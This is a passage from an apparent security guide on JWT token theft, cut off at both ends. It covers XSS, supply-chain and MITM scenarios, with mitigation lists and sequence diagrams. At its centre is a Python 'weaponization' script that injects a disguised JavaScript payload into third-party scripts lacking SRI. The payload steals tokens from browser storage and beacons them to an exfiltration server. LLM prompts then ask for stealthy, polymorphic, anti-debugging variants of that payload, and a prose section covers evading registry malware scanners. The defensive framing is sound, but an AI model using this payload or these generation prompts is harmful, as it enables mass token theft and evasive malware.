1. **HttpOnly Cookie Storage**: Store JWT in HttpOnly cookie instead of Local Storage, making it inaccessible to JavaScript even if XSS exists

2. **Input Sanitization**: Implement server-side HTML sanitization to remove or escape all script tags and event handlers from user-generated content

3. **Content Security Policy**: Deploy strict CSP that blocks inline script execution and restricts script sources to trusted domains only

4. **Output Encoding**: Encode all user-generated content when rendering to browser, converting special characters to HTML entities

5. **Token Validation**: Implement additional validation beyond signature verification, checking token binding to IP address or user agent

6. **Monitoring and Detection**: Deploy security monitoring that detects unusual patterns such as tokens being used from multiple locations simultaneously

7. **Automatic Response**: When anomalous usage detected, automatically invalidate refresh tokens and require re-authentication

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant SS as Secured Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>SS: POST malicious comment with XSS payload
    Note over A,SS: Payload contains script tag<br/>attempting to steal document.cookie
    SS->>SS: Sanitize input - remove script tags
    SS->>SS: Store sanitized comment
    
    V->>SS: GET page with comments
    SS->>SS: Apply CSP header
    SS->>V: Return page with sanitized content + CSP
    Note over SS,V: CSP: default-src self / script-src self
    Note over V: JWT stored in HttpOnly cookie
    
    Note over V: ✓ No malicious script executes (CSP blocks it)
    Note over V: ✓ Even if script ran, cannot access HttpOnly cookie
    
    Note over A,AS: Attack blocked at multiple layers
    
    alt If attacker somehow obtained token
        A->>API: Request with stolen token
        Note over A,API: Authorization: Bearer eyJhbG...
        API->>API: Validate token signature
        API->>API: Validate token binding (IP, User-Agent)
        API--xA: Token binding mismatch - Request denied
        Note over API: ✗ Token rejected due to context mismatch
        
        API->>API: Log security event
        API->>API: Trigger alert for stolen token
        API->>API: Invalidate associated refresh token
    end
    
    Note over SS,API: Defense in depth:<br/>1. Input sanitization prevents injection<br/>2. CSP blocks script execution<br/>3. HttpOnly prevents token access<br/>4. Token binding prevents misuse<br/>5. Monitoring enables response
```

---

### Scenario 2: Token Theft via Compromised Third-Party Script

#### Attack Flow

An e-commerce application uses multiple third-party services including analytics, chat widgets, and advertising networks. An attacker compromises one of these third-party scripts through a supply chain attack, injecting code that steals JWT tokens.

**Step-by-step attack process:**

1. **Supply Chain Compromise**: The attacker gains access to a popular analytics provider's CDN or npm package repository

2. **Malicious Code Injection**: The attacker modifies the analytics script to include token-stealing functionality while maintaining normal analytics behavior to avoid detection

3. **Distribution**: The compromised script is automatically distributed to thousands of websites that include the third-party analytics library

4. **Script Loading**: Victim websites load the compromised script, which now runs with full access to the same-origin context

5. **Token Discovery**: The malicious code scans common token storage locations (localStorage, sessionStorage, cookies)

6. **Selective Exfiltration**: The script silently exfiltrates tokens along with normal analytics data, hiding malicious traffic in legitimate requests

7. **Mass Compromise**: The attacker collects tokens from thousands of users across multiple affected websites

8. **Token Monetization**: Stolen tokens are used for fraud, sold on dark web markets, or used for targeted attacks on high-value accounts

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant CDN as Third-Party CDN
    participant WS as Web Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>CDN: Compromise analytics provider
    Note over A,CDN: Supply chain attack
    A->>CDN: Inject token-stealing code into analytics.js
    
    CDN->>CDN: Modified script deployed
    
    V->>WS: Navigate to e-commerce site
    WS->>V: Return HTML page
    V->>CDN: Load analytics script
    Note over V,CDN: Script tag loads cdn.analytics.com/analytics.js
    
    CDN->>V: Return compromised script
    Note over V: JWT stored in localStorage
    
    V->>V: Execute analytics script
    Note over V: Script performs normal analytics AND steals token
    V->>V: Script reads localStorage.getItem auth_token
    
    V->>AS: Exfiltrate token disguised as analytics
    Note over V,AS: POST analytics.com/track<br/>body includes stolen token
    
    AS->>A: Attacker receives stolen token
    
    A->>API: Use stolen token to access victim account
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>A: Return victim's order history and payment info
    
    A->>API: Place fraudulent orders
    API->>A: Orders successful
```

#### Attack simulation code

**Reconnaissance (Information Gathering):**

For supply chain attacks targeting third-party scripts, the primary reconnaissance tools are **Retire.js**, **Snyk**, and **npm audit**. These tools analyze JavaScript dependencies to identify known vulnerabilities in third-party libraries. Retire.js specifically scans for outdated JavaScript libraries with known security issues in both web pages and node dependencies. Snyk provides comprehensive vulnerability scanning and can identify vulnerable dependencies across the entire software supply chain. Additionally, **Shodan** can be used to discover web applications using specific JavaScript libraries, while **wappalyzer** (browser extension or API) helps identify the technology stack of target websites.

**Reconnaissance Steps:**
1. Use Retire.js browser extension to scan target websites for vulnerable JS libraries
2. Run `npm audit` on any discovered package.json or package-lock.json files
3. Use Snyk CLI (`snyk test`) to perform deep dependency vulnerability analysis
4. Query Shodan for websites using specific CDN-hosted libraries
5. Use wappalyzer to identify analytics, chat widgets, and other third-party integrations
6. Review CDN usage patterns and identify which external scripts are loaded
7. Check for absence of Subresource Integrity (SRI) hashes on external scripts

**Weaponization Python Script:**

```python
#!/usr/bin/env python3
"""
Supply Chain Attack Simulation Script - Third-Party Script Analysis
WARNING: For educational and authorized testing purposes only.
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import json
import argparse
import logging
from urllib.parse import urljoin, urlparse

# Configure logging for detailed output
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def analyze_external_scripts(target_url: str, session: requests.Session) -> list:
    """
    Analyze a target page for external script dependencies.
    Identifies scripts loaded from third-party sources and checks for SRI protection.
    """
    external_scripts = []
    
    try:
        # Fetch the target page
        response = session.get(target_url, timeout=15)
        response.raise_for_status()
        
        # Parse HTML content
        soup = BeautifulSoup(response.text, 'html.parser')
        target_domain = urlparse(target_url).netloc
        
        # Find all script tags
        for script in soup.find_all('script', src=True):
            script_src = script.get('src', '')
            full_url = urljoin(target_url, script_src)
            script_domain = urlparse(full_url).netloc
            
            # Check if script is from a third-party domain
            if script_domain and script_domain != target_domain:
                script_info = {
                    'url': full_url,
                    'domain': script_domain,
                    'has_integrity': script.get('integrity') is not None,
                    'integrity_hash': script.get('integrity', 'None'),
                    'crossorigin': script.get('crossorigin', 'None'),
                    'vulnerable': not script.get('integrity')  # No SRI = potentially vulnerable
                }
                external_scripts.append(script_info)
                
                # Log findings
                protection_status = "Protected (SRI)" if script_info['has_integrity'] else "VULNERABLE (No SRI)"
                logger.info(f"External script: {script_domain} - {protection_status}")
        
        logger.info(f"Found {len(external_scripts)} external scripts")
        
    except requests.RequestException as e:
        logger.error(f"Error analyzing target: {e}")
    
    return external_scripts


def compute_script_hash(script_url: str, session: requests.Session) -> dict:
    """
    Download a script and compute its hash for SRI comparison.
    Used to detect if a script has been modified from its expected content.
    """
    hash_info = {
        'url': script_url,
        'sha256': None,
        'sha384': None,
        'sha512': None,
        'content_length': 0,
        'error': None
    }
    
    try:
        # Download the script content
        response = session.get(script_url, timeout=15)
        response.raise_for_status()
        content = response.content
        
        # Compute various hash types used in SRI
        hash_info['sha256'] = f"sha256-{hashlib.sha256(content).hexdigest()}"
        hash_info['sha384'] = f"sha384-{hashlib.sha384(content).hexdigest()}"
        hash_info['sha512'] = f"sha512-{hashlib.sha512(content).hexdigest()}"
        hash_info['content_length'] = len(content)
        
        logger.info(f"Computed hashes for {urlparse(script_url).path}")
        
    except requests.RequestException as e:
        hash_info['error'] = str(e)
        logger.error(f"Error fetching script {script_url}: {e}")
    
    return hash_info


def simulate_malicious_modification(script_url: str, exfil_server: str, 
                                    session: requests.Session) -> str:
    """
    Simulate how an attacker would modify a legitimate script to include
    token-stealing functionality. Returns the modified script content.
    """
    try:
        # Fetch the original script
        response = session.get(script_url, timeout=15)
        response.raise_for_status()
        original_script = response.text
        
        # Malicious payload to inject - designed to blend with analytics-style code
        malicious_payload = f'''
// Performance monitoring enhancement (appears legitimate)
(function() {{
    var _0x1 = function() {{
        try {{
            // Collect "performance" data (actually stealing tokens)
            var t = localStorage.getItem("jwt_token") || 
                    localStorage.getItem("access_token") ||
                    localStorage.getItem("auth_token") ||
                    sessionStorage.getItem("token");
            
            if (t && t.length > 10) {{
                // Send to "analytics" endpoint (actually exfiltration server)
                var img = new Image();
                img.src = "{exfil_server}/analytics/perf?data=" + 
                          encodeURIComponent(btoa(t)) + 
                          "&t=" + Date.now() + 
                          "&ref=" + encodeURIComponent(location.href);
            }}
        }} catch(e) {{}}
    }};
    
    // Execute after page load to avoid detection
    if (document.readyState === 'complete') {{
        setTimeout(_0x1, 2000);
    }} else {{
        window.addEventListener('load', function() {{
            setTimeout(_0x1, 2000);
        }});
    }}
}})();
'''
        
        # Insert malicious code at the beginning (before legitimate code)
        # This makes it execute first and harder to detect in large files
        modified_script = malicious_payload + "\n" + original_script
        
        logger.warning(f"Created modified version of script with exfil payload")
        logger.info(f"Original size: {len(original_script)}, Modified size: {len(modified_script)}")
        
        return modified_script
        
    except requests.RequestException as e:
        logger.error(f"Error modifying script: {e}")
        return ""


def check_cdn_security(script_url: str, session: requests.Session) -> dict:
    """
    Check CDN security headers and configuration for potential weaknesses
    that could allow supply chain compromise.
    """
    security_analysis = {
        'url': script_url,
        'headers': {},
        'vulnerabilities': []
    }
    
    try:
        response = session.head(script_url, timeout=10)
        headers = dict(response.headers)
        security_analysis['headers'] = headers
        
        # Check for security headers
        if 'Content-Security-Policy' not in headers:
            security_analysis['vulnerabilities'].append("No CSP header on CDN response")
        
        if 'X-Content-Type-Options' not in headers:
            security_analysis['vulnerabilities'].append("Missing X-Content-Type-Options")
        
        # Check cache control (longer cache = longer attack window if compromised)
        cache_control = headers.get('Cache-Control', '')
        if 'max-age' in cache_control:
            # Extract max-age value
            import re
            match = re.search(r'max-age=(\d+)', cache_control)
            if match:
                max_age = int(match.group(1))
                if max_age > 86400:  # More than 1 day
                    security_analysis['vulnerabilities'].append(
                        f"Long cache duration ({max_age}s) extends attack window")
        
        logger.info(f"CDN security check: {len(security_analysis['vulnerabilities'])} issues found")
        
    except requests.RequestException as e:
        security_analysis['vulnerabilities'].append(f"Error checking CDN: {e}")
    
    return security_analysis


def run_supply_chain_analysis(target_url: str, exfil_server: str):
    """
    Main function to run the complete supply chain attack simulation.
    Performs reconnaissance and generates attack payloads.
    """
    logger.info(f"Starting supply chain attack simulation against: {target_url}")
    
    # Create session with headers mimicking a real browser
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5'
    })
    
    # Step 1: Analyze external scripts on target page
    external_scripts = analyze_external_scripts(target_url, session)
    
    if not external_scripts:
        logger.warning("No external scripts found. Target may not use third-party JS.")
        return
    
    # Step 2: Compute hashes for each script (for comparison)
    script_hashes = []
    for script in external_scripts:
        hash_info = compute_script_hash(script['url'], session)
        script_hashes.append(hash_info)
    
    # Step 3: Check CDN security for vulnerable scripts
    for script in external_scripts:
        if script['vulnerable']:  # No SRI protection
            security = check_cdn_security(script['url'], session)
            script['cdn_security'] = security
    
    # Step 4: Simulate modification of vulnerable scripts
    vulnerable_scripts = [s for s in external_scripts if s['vulnerable']]
    logger.info(f"Found {len(vulnerable_scripts)} scripts without SRI protection")
    
    for script in vulnerable_scripts[:1]:  # Demonstrate with first vulnerable script
        modified = simulate_malicious_modification(script['url'], exfil_server, session)
        if modified:
            logger.warning(f"Attack payload generated for: {script['domain']}")
    
    # Generate summary report
    report = {
        'target': target_url,
        'total_external_scripts': len(external_scripts),
        'vulnerable_scripts': len(vulnerable_scripts),
        'scripts': external_scripts
    }
    
    print(json.dumps(report, indent=2))
    logger.info("Supply chain analysis complete")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Supply Chain Attack Simulation")
    parser.add_argument("--target", required=True, help="Target URL to analyze")
    parser.add_argument("--exfil-server", required=True, 
                        help="Exfiltration server URL for attack simulation")
    args = parser.parse_args()
    
    run_supply_chain_analysis(args.target, args.exfil_server)
```

#### AI-ML-Enhanced Attack Techniques

**1. LLM-Enhanced Supply Chain Attack Script: Intelligent Automation**

The standard Supply Chain Attack script provides essential reconnaissance and vulnerability identification, but integrating LLMs transforms it into an intelligent security analysis platform. LLM enhancement enables the script to understand script behavior semantically, generate context-aware malicious payloads that blend with legitimate code, and leverage real-time threat intelligence for CDN vulnerability assessment. Each enhancement augments a specific function in the base script to provide deeper insights and more sophisticated attack simulation capabilities.

**LLM Enhancement 1: Intelligent Script Behavior Analysis**

This enhancement integrates with `analyze_external_scripts()` to classify scripts by function and prioritize high-value targets. Instead of just checking for SRI, the LLM analyzes what each external script does and assesses its access to sensitive data.

**Integration Point:** Call `llm_analyze_script_behavior()` after fetching each external script.

```python
# =============================================================================
# LLM ENHANCEMENT 1: INTELLIGENT SCRIPT BEHAVIOR ANALYSIS
# Integrates with: analyze_external_scripts() function
# =============================================================================

def llm_analyze_script_behavior(script_url: str, 
                                 script_content: str,
                                 session: requests.Session) -> dict:
    """
    Use LLM to analyze script content and determine its purpose, 
    data access patterns, and attack value.
    
    Args:
        script_url: URL of the script
        script_content: The JavaScript content
        session: Request session
        
    Returns:
        Behavior analysis with risk assessment
    """
    
    # Truncate script to avoid token limits
    script_sample = script_content[:8000] if len(script_content) > 8000 else script_content
    
    prompt = f"""Analyze this JavaScript library to determine its purpose and security implications.

SCRIPT URL: {script_url}
SCRIPT CONTENT (sample):
{script_sample}

ANALYSIS TASKS:
1. Identify the primary purpose (analytics, UI framework, payment, auth, utility, etc.)
2. Detect if it accesses sensitive browser APIs:
   - localStorage/sessionStorage
   - document.cookie
   - XMLHttpRequest/fetch to external domains
   - WebSocket connections
   - Clipboard API
   - Geolocation
3. Identify any existing data collection behavior
4. Assess potential for abuse if compromised
5. Look for signs of minification, obfuscation, or embedded third-party code

Respond in JSON format:
{{
    "script_type": "analytics|ui_framework|payment|auth_sdk|utility|polyfill|unknown",
    "library_name": "detected name or unknown",
    "version": "detected version or unknown",
    "sensitive_api_access": [
        {{
            "api": "localStorage|sessionStorage|cookies|fetch|etc",
            "usage_pattern": "description of how it's used",
            "data_accessed": "what data it reads/writes"
        }}
    ],
    "existing_data_collection": {{
        "collects_data": true|false,
        "data_types": ["list of data types"],
        "exfiltration_endpoints": ["list of URLs data is sent to"]
    }},
    "attack_value": {{
        "score": 1-10,
        "reasoning": "why this is a valuable target",
        "attack_vectors": ["ways to abuse if compromised"]
    }},
    "obfuscation_detected": true|false,
    "embedded_third_party": ["list of embedded external dependencies"],
    "risk_indicators": ["list of concerning patterns"]
}}
"""
    
    response = query_llm(prompt)
    
    try:
        analysis = json.loads(response)
        
        # Log high-value targets
        attack_score = analysis.get('attack_value', {}).get('score', 0)
        if attack_score >= 7:
            logger.warning(f"HIGH-VALUE TARGET: {script_url} (score: {attack_score}/10)")
            logger.warning(f"  Type: {analysis.get('script_type')}")
            logger.warning(f"  Reason: {analysis.get('attack_value', {}).get('reasoning')}")
        
        return analysis
        
    except json.JSONDecodeError:
        logger.error(f"Failed to parse LLM analysis for {script_url}")
        return {'error': 'parse_failed'}


def llm_prioritize_targets(all_scripts: list) -> list:
    """
    Use LLM to rank scripts by attack priority based on combined analysis.
    """
    
    scripts_summary = []
    for script in all_scripts:
        scripts_summary.append({
            'url': script.get('url'),
            'type': script.get('behavior_analysis', {}).get('script_type', 'unknown'),
            'attack_score': script.get('behavior_analysis', {}).get('attack_value', {}).get('score', 0),
            'has_sri': script.get('has_integrity', False),
            'sensitive_access': len(script.get('behavior_analysis', {}).get('sensitive_api_access', []))
        })
    
    prompt = f"""Prioritize these scripts for supply chain attack targeting.

SCRIPTS FOUND:
{json.dumps(scripts_summary, indent=2)}

Rank by:
1. Attack value (what can be stolen/compromised)
2. Vulnerability (no SRI = easier to exploit)
3. Reach (frameworks used on many pages > utility on one page)
4. Stealth (analytics scripts less scrutinized than payment scripts)

Respond with ordered list:
{{
    "priority_ranking": [
        {{
            "rank": 1,
            "url": "...",
            "attack_strategy": "recommended approach",
            "expected_impact": "what attacker gains"
        }}
    ],
    "recommended_first_target": "url of best target",
    "reasoning": "why this order"
}}
"""
    
    response = query_llm(prompt)
    
    try:
        return json.loads(response)
    except:
        return {'priority_ranking': [], 'error': 'parse_failed'}
```

**LLM Enhancement 2: Smart Malicious Payload Generation**

This enhancement replaces the static payload in `simulate_malicious_modification()` with LLM-generated code that mimics the original script's coding style, making detection much harder.

**Integration Point:** Call `llm_generate_stealth_payload()` instead of using hardcoded malicious code.

```python
# =============================================================================
# LLM ENHANCEMENT 2: SMART MALICIOUS PAYLOAD GENERATION
# Integrates with: simulate_malicious_modification() function
# =============================================================================

def llm_generate_stealth_payload(original_script: str,
                                  script_type: str,
                                  exfil_server: str,
                                  token_locations: list = None) -> dict:
    """
    Generate malicious payload that mimics the original script's coding style.
    
    Args:
        original_script: The legitimate script content
        script_type: Type of script (analytics, ui_framework, etc.)
        exfil_server: URL for token exfiltration
        token_locations: Where tokens might be stored
        
    Returns:
        Payload dict with code and metadata
    """
    
    if token_locations is None:
        token_locations = ['localStorage', 'sessionStorage', 'document.cookie']
    
    # Sample the original script for style analysis
    script_sample = original_script[:5000]
    
    prompt = f"""Generate malicious JavaScript that blends with this library's coding style.

ORIGINAL SCRIPT TYPE: {script_type}
ORIGINAL SCRIPT SAMPLE:
{script_sample}

REQUIREMENTS:
1. Match the coding style (naming conventions, structure, comments)
2. Appear as a legitimate extension or bug fix
3. Execute silently without errors or console output
4. Steal tokens from: {token_locations}
5. Exfiltrate to: {exfil_server}
6. Use stealthy exfiltration (image beacon, navigator.sendBeacon, or hidden iframe)
7. Include anti-debugging measures
8. Execute only once per session (avoid repeated exfiltration)

STYLE REQUIREMENTS:
- If original uses camelCase, use camelCase
- If original has JSDoc comments, add similar comments
- If original is minified, generate minified-looking code
- Make function/variable names related to the script's domain

ANTI-DETECTION FEATURES:
- Delay execution by random interval (2-10 seconds)
- Check for developer tools before executing
- Use indirect eval or Function constructor
- Avoid blacklisted keywords like 'hack', 'steal', 'exfil'

Respond in JSON:
{{
    "payload": "the malicious code",
    "disguise_name": "name that matches script context (e.g., 'performanceTracker' for analytics)",
    "insertion_point": "beginning|end|middle",
    "trigger": "how it activates (DOMContentLoaded, scroll, timeout)",
    "exfil_method": "how data is exfiltrated",
    "anti_detection_features": ["list of evasion techniques used"],
    "expected_blend_score": 1-10
}}
"""
    
    response = query_llm(prompt)
    
    try:
        result = json.loads(response)
        
        logger.info(f"Generated stealth payload:")
        logger.info(f"  Disguise: {result.get('disguise_name')}")
        logger.info(f"  Blend score: {result.get('expected_blend_score')}/10")
        logger.info(f"  Trigger: {result.get('trigger')}")
        
        return result
        
    except json.JSONDecodeError:
        logger.error("Failed to generate stealth payload")
        return {'error': 'generation_failed'}


def llm_generate_polymorphic_variants(base_payload: str, 
                                       num_variants: int = 5) -> list:
    """
    Generate multiple functionally equivalent variants of a payload
    to defeat signature-based detection.
    """
    
    prompt = f"""Generate {num_variants} functionally equivalent variants of this malicious payload.

ORIGINAL PAYLOAD:
{base_payload}

Each variant must:
1. Achieve exactly the same result (token theft + exfiltration)
2. Use completely different code structure
3. Use different obfuscation techniques
4. Be undetectable as a copy of the others

VARIATION TECHNIQUES TO USE:
1. Different variable/function names for each variant
2. Alternative JavaScript methods (forEach vs for loop vs map)
3. Different string encoding (hex, unicode, base64, charcode)
4. Alternative exfiltration (Image vs fetch vs WebSocket vs form submit)
5. Different execution triggers
6. Varying amounts of decoy/benign code

Respond as JSON array:
[
    {{
        "variant_id": 1,
        "code": "...",
        "obfuscation_technique": "primary technique used",
        "exfil_method": "how it sends data",
        "uniqueness_features": ["what makes this variant unique"]
    }}
]
"""
    
    response = query_llm(prompt)
    
    try:
        variants = json.loads(response)
        logger.info(f"Generated {len(variants)} polymorphic payload variants")
        return variants
    except:
        return []
```

**LLM Enhancement 3: CDN Vulnerability Intelligence**

This enhancement integrates with `check_cdn_security()` to provide real-time threat intelligence about CDN providers and specific library versions.

**Integration Point:** Call `llm_cdn_intelligence()` after basic security header checks.

```python
# =============================================================================
# LLM ENHANCEMENT 3: CDN VULNERABILITY INTELLIGENCE
# Integrates with: check_cdn_security() function
# =============================================================================

def llm_cdn_intelligence(cdn_domain: str,
                          script_path: str,
                          observed_headers: dict) -> dict:
    """
    Use LLM knowledge to assess CDN and library-specific vulnerabilities.
    
    Args:
        cdn_domain: The CDN provider domain
        script_path: Path to the script on CDN
        observed_headers: HTTP headers from CDN response
        
    Returns:
        Intelligence report with known vulnerabilities and attack vectors
    """
    
    prompt = f"""Provide security intelligence for this CDN-hosted resource.

CDN DOMAIN: {cdn_domain}
SCRIPT PATH: {script_path}
OBSERVED HEADERS: {json.dumps(observed_headers, indent=2)}

INTELLIGENCE REQUIRED:

1. CDN PROVIDER ASSESSMENT:
   - Is this a major CDN (cdnjs, unpkg, jsdelivr) or lesser-known?
   - Known security incidents involving this CDN?
   - Account security requirements (2FA, security key)?
   - Past cases of CDN compromise or malicious package publishing?

2. LIBRARY IDENTIFICATION:
   - What library is this (from path)?
   - What version (from path or headers)?
   - Known CVEs for this library/version?
   - Recent security advisories?

3. SUPPLY CHAIN RISK:
   - How is this CDN populated (automated from npm, manual, etc.)?
   - Single maintainer risk?
   - Known typosquatting variants?
   - Dependency confusion vulnerabilities?

4. ATTACK VECTORS:
   - How could an attacker compromise this specific resource?
   - Account takeover feasibility?
   - DNS hijacking possibilities?
   - Build pipeline injection?

Respond in JSON:
{{
    "cdn_assessment": {{
        "provider_name": "...",
        "security_reputation": "high|medium|low",
        "known_incidents": ["list of past incidents"],
        "account_security": "strong|moderate|weak|unknown"
    }},
    "library_info": {{
        "name": "...",
        "detected_version": "...",
        "latest_version": "...",
        "known_cves": [
            {{
                "cve_id": "CVE-XXXX-XXXX",
                "severity": "critical|high|medium|low",
                "description": "...",
                "affects_this_version": true|false
            }}
        ],
        "security_advisories": ["recent advisories"]
    }},
    "supply_chain_risks": {{
        "population_method": "npm_mirror|manual|automated",
        "maintainer_count": "single|few|many",
        "typosquatting_variants": ["list of known malicious variants"],
        "dependency_confusion_risk": "high|medium|low"
    }},
    "attack_vectors": [
        {{
            "vector": "attack method",
            "feasibility": "high|medium|low",
            "required_access": "what attacker needs",
            "detection_difficulty": "easy|moderate|hard"
        }}
    ],
    "overall_risk_score": 1-10,
    "recommended_action": "what should be done"
}}
"""
    
    response = query_llm(prompt)
    
    try:
        intel = json.loads(response)
        
        # Log critical findings
        risk_score = intel.get('overall_risk_score', 0)
        if risk_score >= 7:
            logger.warning(f"HIGH RISK CDN RESOURCE: {cdn_domain}{script_path}")
            for cve in intel.get('library_info', {}).get('known_cves', []):
                if cve.get('affects_this_version'):
                    logger.warning(f"  VULNERABLE: {cve.get('cve_id')} - {cve.get('severity')}")
        
        return intel
        
    except json.JSONDecodeError:
        logger.error("Failed to parse CDN intelligence")
        return {'error': 'parse_failed'}


def llm_generate_remediation_guidance(vulnerability_report: dict) -> dict:
    """
    Generate actionable remediation guidance based on findings.
    """
    
    prompt = f"""Generate remediation guidance for these supply chain vulnerabilities.

VULNERABILITY REPORT:
{json.dumps(vulnerability_report, indent=2)}

Provide:
1. Immediate actions (0-24 hours)
2. Short-term fixes (1-7 days)
3. Long-term improvements (1-3 months)
4. Specific SRI hashes to implement
5. CSP directives to add

Respond in JSON:
{{
    "immediate_actions": [
        {{
            "action": "what to do",
            "priority": "critical|high|medium",
            "implementation": "how to do it"
        }}
    ],
    "sri_recommendations": [
        {{
            "script_url": "...",
            "recommended_tag": "<script src='...' integrity='...' crossorigin='anonymous'></script>"
        }}
    ],
    "csp_recommendations": {{
        "script-src": "recommended directive",
        "connect-src": "recommended directive"
    }},
    "monitoring_recommendations": ["what to monitor going forward"]
}}
"""
    
    response = query_llm(prompt)
    
    try:
        return json.loads(response)
    except:
        return {'error': 'generation_failed'}
```


**2. ML-Based Supply Chain Vulnerability Prediction and Target Selection**

Machine learning models can be trained on historical vulnerability data to predict which third-party packages and CDN-hosted libraries are likely to contain exploitable vulnerabilities in the future, enabling proactive target selection. These predictive models analyze patterns in past security incidents, including factors like maintainer activity, code complexity, dependency depth, and community engagement to identify libraries with higher compromise potential. By incorporating natural language processing of commit messages and issue trackers, the model can detect signs of security debt or abandoned maintenance that often precede vulnerabilities. Attackers can prioritize supply chain attack targets based on estimated vulnerability probability combined with the library's deployment footprint across high-value websites. Graph neural networks are particularly effective here, as they can model the complex dependency relationships in the npm/PyPI ecosystem and identify libraries that are both vulnerable and widely depended upon. The model can also predict the likely time window between vulnerability introduction and discovery, allowing attackers to maximize the exploitation period. This approach transforms opportunistic supply chain attacks into strategic, data-driven campaigns with higher success rates. By continuously retraining on new vulnerability disclosures, the model stays current with evolving attack surfaces.

**3. LLM-Generated Polymorphic Malicious Code with Semantic Preservation**

Large Language Models can generate countless variations of token-stealing JavaScript code that maintain malicious functionality while appearing completely different in structure, defeating signature-based detection systems. Unlike simple obfuscation techniques that apply mechanical transformations, LLMs understand the semantic intent of the code and can express the same logic using entirely different approaches, variable names, and code patterns. The model can be prompted to generate code that mimics the style of legitimate analytics or performance monitoring libraries, making malicious insertions blend seamlessly with existing codebases. By training on large corpuses of benign JavaScript from popular libraries, the LLM learns idiomatic patterns and can generate malicious code that statistically resembles normal library code under analysis. Each generated variant can use different exfiltration techniques (fetch, XMLHttpRequest, dynamic script injection, WebSocket, Image beacon) based on what would be least suspicious in the target context. The polymorphic nature means that even if one variant is detected and blocked, hundreds of functionally equivalent alternatives can be generated instantly. This capability turns static malware signatures into an ineffective defense, as the attack surface becomes essentially infinite. Security vendors would need to develop semantic-level analysis tools to counter this threat effectively.

**4. Adversarial ML for Detection Evasion in Package Registries**

Adversarial machine learning techniques can be employed to craft malicious packages that systematically evade automated security scanning systems used by npm, PyPI, and other package registries. Many package registries now employ ML-based malware detection that analyzes package behavior, code patterns, and metadata to identify suspicious submissions. Attackers can use gradient-based adversarial techniques to probe these detection systems and discover modifications that flip the classification from malicious to benign. This involves treating the detector as a black-box oracle and using feedback from rejection/acceptance to guide payload modification through techniques like evolutionary algorithms or reinforcement learning. The attacker can add carefully designed benign code segments that shift the package's embedding away from malicious clusters in the detector's feature space without affecting the malicious functionality. By analyzing detection patterns across multiple registry submissions, attackers can map the decision boundaries of these systems and find consistent evasion strategies. The arms race between registry security and adversarial techniques means that package maintainers face a constantly evolving threat landscape. This approach enables the creation of "weaponized" packages that pass automated security gates while containing dormant or trigger-activated malicious functionality.


#### Mitigation Application

Implementing controls specifically targeting third-party script risks prevents this attack:

**Step-by-step mitigation:**

1. **Subresource Integrity (SRI)**: Use SRI hashes on all external script tags, causing browsers to reject modified scripts that don't match the expected hash

2. **Strict Content Security Policy**: Configure CSP to whitelist only specific trusted script sources and block data exfiltration to unauthorized domains

3. **HttpOnly Cookie Storage**: Store tokens in HttpOnly cookies, preventing third-party scripts from accessing them even when loaded on the page

4. **Script Isolation**: Load third-party scripts in sandboxed iframes with restricted permissions when possible

5. **Network Monitoring**: Monitor outbound network requests for suspicious patterns, such as authentication data being sent to unexpected domains

6. **Dependency Auditing**: Regularly audit third-party dependencies and maintain an inventory of all external scripts

7. **Rapid Response**: Maintain capability to quickly remove or update third-party scripts when compromises are discovered

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant CDN as Third-Party CDN
    participant SS as Secured Server
    participant V as Victim Browser
    participant AS as Attacker Server
    participant API as API Server

    A->>CDN: Compromise analytics provider
    A->>CDN: Inject malicious code into analytics.js
    CDN->>CDN: Script modified (hash changed)
    
    V->>SS: Navigate to e-commerce site
    SS->>V: Return HTML with SRI and strict CSP
    Note over SS,V: Script tag with integrity=sha384-expected-hash<br/>CSP restricts script-src and connect-src
    Note over V: JWT stored in HttpOnly cookie
    
    V->>CDN: Request analytics script
    CDN->>V: Return compromised script
    
    V->>V: Calculate script hash
    V->>V: Compare with SRI hash
    Note over V: ✗ Hash mismatch detected!
    V--xV: Refuse to execute script
    Note over V: Script blocked by SRI validation
    
    alt If script somehow executed (backup defense)
        V->>V: Script attempts localStorage access
        Note over V: ✓ Token not in localStorage (HttpOnly cookie)
        V->>V: Script finds no token to steal
        
        V--xAS: Script attempts exfiltration
        Note over V: ✗ CSP blocks connection to unauthorized domain
    end
    
    SS->>SS: Monitor CSP violation reports
    SS->>SS: Alert on SRI failures
    SS->>SS: Remove/update compromised script
    
    Note over SS,API: Defense in depth:<br/>1. SRI prevents execution of modified scripts<br/>2. CSP restricts script capabilities<br/>3. HttpOnly prevents token access<br/>4. connect-src limits data exfiltration<br/>5. Monitoring enables rapid response
```

---

### Scenario 3: Man-in-the-Middle Attack on Insecure Connection

#### Attack Flow

A user accesses their company's web portal from a coffee shop using public Wi-Fi. The application uses HTTPS but doesn't enforce it properly, and the attacker performs a man-in-the-middle attack to intercept the JWT token.

**Step-by-step attack process:**

1. **Network Position**: The attacker sets up a rogue Wi-Fi access point with a convincing name ("CoffeeShop-Guest-WiFi") or compromises the legitimate access point

2. **Victim Connection**: The user connects to the malicious Wi-Fi network to access their company portal

3. **SSL Stripping**: The attacker uses SSL stripping tools to intercept HTTPS connections and downgrade them to HTTP where possible

4. **Initial Request Interception**: When the user navigates to the portal, the attacker's MITM proxy intercepts the request

5. **Protocol Downgrade**: The proxy presents an HTTP version of the site to the victim while maintaining HTTPS to the real server, or presents a fake certificate

6. **Authentication Capture**: When the user logs in, the attacker captures the credentials and the JWT token issued by the server

7. **Token Interception**: All subsequent requests containing the JWT token in headers or cookies are intercepted and logged

8. **Token Replay**: The attacker uses the captured token from their own device to access the victim's account on the legitimate HTTPS connection

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker (MITM Proxy)
    participant V as Victim
    participant WS as Web Server
    participant API as API Server

